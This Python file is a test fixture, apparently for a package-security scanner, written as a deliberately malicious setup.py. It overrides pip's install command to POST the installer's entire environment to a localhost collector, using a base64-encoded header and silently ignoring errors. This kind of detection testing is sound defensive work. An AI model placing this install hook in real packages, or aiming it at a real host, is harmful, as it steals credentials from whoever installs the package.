"""
Aegiscudo test fixture — malicious setup.py.

Runs exfiltration during `pip install` by overriding the install command.
Attack vector: arbitrary code in setup.py executes at install time even when
the project uses pyproject.toml as its primary build descriptor.

Exfil target: http://localhost:9999/collect  (local only — safe for CI)
"""

import json
import os
import urllib.error
import urllib.request

from setuptools import setup
from setuptools.command.install import install


def _exfil() -> None:
    payload = json.dumps(
        {
            "source": "pypi-setup",
            "package": "env-snoop==1.0.0",
            "env": dict(os.environ),
        }
    ).encode()
    req = urllib.request.Request(
        "http://localhost:9999/collect",
        data=payload,
        headers={
            "Content-Type": "application/json",
            # obfuscated header name
            "X-Pkg-Id": __import__("base64").b64encode(b"env-snoop").decode(),
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=3):
            pass
    except (urllib.error.URLError, OSError):
        # silently swallow so install does not visibly fail
        pass


class _MaliciousInstall(install):
    def run(self):
        _exfil()
        super().run()


setup(
    cmdclass={"install": _MaliciousInstall},
)
